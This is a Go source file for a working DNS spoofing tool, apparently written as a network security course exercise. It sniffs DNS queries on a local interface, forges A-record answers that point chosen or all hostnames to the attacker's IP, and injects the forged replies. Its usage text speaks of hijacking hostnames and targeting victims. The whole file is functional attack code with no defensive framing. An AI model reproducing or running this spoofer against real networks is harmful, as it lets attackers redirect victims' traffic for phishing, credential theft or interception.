package poison

import (
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"io/ioutil"
	"net"
	"os"
	"strings"
)

var (
	ifcName       string // interface name
	hostFile      string
	bpfFilter     string
	defaultIP     net.IP
	ipHostMapping map[string]string

	parser     *gopacket.DecodingLayerParser
	decoded    []gopacket.LayerType
	serialOpts gopacket.SerializeOptions
	serialBuf  gopacket.SerializeBuffer

	eth  layers.Ethernet
	ipv4 layers.IPv4
	udp  layers.UDP
	dns  layers.DNS
)

// go run dnspoison.go [-i interface] [-f hostnames] [expression]
func main() {
	parseCommand()

	// opens a device and returns a handle
	handle, err := pcap.OpenLive(ifcName, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter(bpfFilter); err != nil {
		panic(err)
	}
	defer handle.Close()

	defaultIP = queryIfcAddr(ifcName)     // get ip addr relates to the specified interface
	ipHostMapping = readMapping(hostFile) // read ip host mapping from file

	setupDecoder()
	for {
		packetData, _, _ := handle.ReadPacketData() // read the next packet from the pcap handle
		err = parser.DecodeLayers(packetData, &decoded)
		if len(decoded) != 4 || dns.QR { // if QR = 1, means it is a DNS response packet
			continue
		}

		handlePackets(handle)
	}

}

func parseCommand() {
	flag.StringVar(&ifcName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
	flag.Usage = func() {
		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
	}
	flag.Parse()
	bpfFilterArr := flag.Args()
	if ifcName == "" { // interface is not specified, set as default device interface
		ifs, _ := pcap.FindAllDevs()
		ifcName = ifs[0].Name
	}
	if flag.NArg() != 0 {
		bpfFilter = strings.Join(bpfFilterArr, " ")
	} else {
		bpfFilter = "udp port 53"
	}
	// fmt.Println("Arguments:", ifcName, hostFile, strings.Join(bpfFilterArr, " "))
}

func queryIfcAddr(ifcName string) net.IP {
	interfaces, _ := net.Interfaces()
	for i := range interfaces {
		if interfaces[i].Name == ifcName {
			addrs, err := interfaces[i].Addrs()
			if err != nil {
				panic(err)
			}

			if len(addrs) == 0 {
				panic("No addr relates to specified interface")
			}

			for _, addr := range addrs {
				ip, _, _ := net.ParseCIDR(addr.String())
				if ip.To4() != nil {
					fmt.Println("ip to interface", ifcName, ip)
					return ip
				}
			}
		}
	}
	return nil
}

func readMapping(filename string) map[string]string {
	if filename == "" {
		return nil // return an empty map if filename not specified
	}

	ipHost := make(map[string]string)
	data, _ := ioutil.ReadFile(filename)
	lines := strings.Split(string(data), "\n")
	for _, element := range lines {
		line := strings.Fields(element)
		if len(line) == 0 {
			break
		}
		ipHost[line[1]] = line[0]
	}
	fmt.Println(ipHost)
	return ipHost
}

func setupDecoder() {
	// Here we use Fast Decoding With DecodingLayerParser,
	// which takes about 10% of the time as NewPacket to decode packet data.
	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ipv4, &udp, &dns)
	decoded = make([]gopacket.LayerType, 0, 4)
	serialBuf = gopacket.NewSerializeBuffer()
	serialOpts = gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
}

func handlePackets(handle *pcap.Handle) {
	fmt.Println("========== Packet captured! ==========")
	fmt.Printf("DNS questions: total %v\n", dns.QDCount)
	var i uint16
	for i = 0; i < dns.QDCount; i++ {
		fmt.Printf("[%v]: %v", i, string(dns.Questions[i].Name))
	}

	dns.QR = true // QR: true indicates a response packet
	if dns.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
		dns.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
	}

	matched := false
	var q layers.DNSQuestion
	for i = 0; i < dns.QDCount; i++ { // iterate through questions
		q = dns.Questions[i]
		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
			continue
		}

		a := buildDNSAnswer(q)
		if a.IP != nil {
			matched = true
			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
			dns.Answers = append(dns.Answers, a)
			dns.ANCount = dns.ANCount + 1
			fmt.Printf("DNS answer total: %v\n", dns.ANCount)
		}
	}
	if matched == false {
		fmt.Println("no need to forge response")
		return
	}
	// swap src/dst in each layer
	swapSrcDst()
	// serialize packets
	_ = udp.SetNetworkLayerForChecksum(&ipv4)
	_ = gopacket.SerializeLayers(serialBuf, serialOpts, &eth, &ipv4, &udp, &dns)
	// write packet
	err := handle.WritePacketData(serialBuf.Bytes())
	if err != nil {
		panic(err)
	}

	fmt.Println("Response sent")
}

func buildDNSAnswer(q layers.DNSQuestion) layers.DNSResourceRecord {
	var a layers.DNSResourceRecord
	a.Type = layers.DNSTypeA
	a.Class = layers.DNSClassIN
	a.TTL = 300
	a.Name = q.Name
	a.IP = getForgedIp(string(q.Name))
	return a
}

// return nil if file is specified while corresponding host is not provided
func getForgedIp(queryName string) net.IP {
	if ipHostMapping == nil { // mapping file is not specified, use ip addr of interface
		return defaultIP
	} else if ipStr, ok := ipHostMapping[queryName]; ok { // use ip addr in mapping file
		return net.ParseIP(ipStr)
	} else { // ip addr is not provided in mapping file, ignore
		return nil
	}
}

func swapSrcDst() {
	// swap src/dst mac
	tmpMac := eth.SrcMAC
	eth.SrcMAC = eth.DstMAC
	eth.DstMAC = tmpMac
	// swap src/dst ip
	tmpIP := ipv4.SrcIP
	ipv4.SrcIP = ipv4.DstIP
	ipv4.DstIP = tmpIP
	fmt.Printf("IP: src %v, dst %v\n", ipv4.SrcIP, ipv4.DstIP)
	// swap src/dst udp ports
	tmpPort := udp.SrcPort
	udp.SrcPort = udp.DstPort
	udp.DstPort = tmpPort
	fmt.Printf("UDP port: src %v, dst %v\n", udp.SrcPort, udp.DstPort)
}
